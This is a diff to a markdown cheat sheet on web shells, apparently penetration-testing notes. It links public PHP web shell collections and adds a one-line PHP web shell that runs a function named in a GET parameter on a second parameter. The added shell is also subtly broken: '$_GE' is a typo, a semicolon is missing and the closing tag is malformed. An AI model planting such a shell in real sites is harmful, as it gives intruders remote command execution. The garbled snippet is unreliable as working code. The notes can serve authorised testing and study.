@@ -14,8 +14,9 @@
 [p0wney web shell](https://github.com/flozz/p0wny-shell)  
 [white winter wolf web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)  
 [collection of PHP webshells](https://github.com/JohnTroony/php-webshells/tree/master/Collection)    
+/usr/share/seclists/Web-Shells    
 
-    /usr/share/seclists/Web-Shells
+    <?php if(isset($_GET[0])){echo $_GE[0]($_GET[1]) } ? >     
 
 ## Debugging Shells   
 executing a command and no response - maybe the command is redirecting to stderr not stdout?
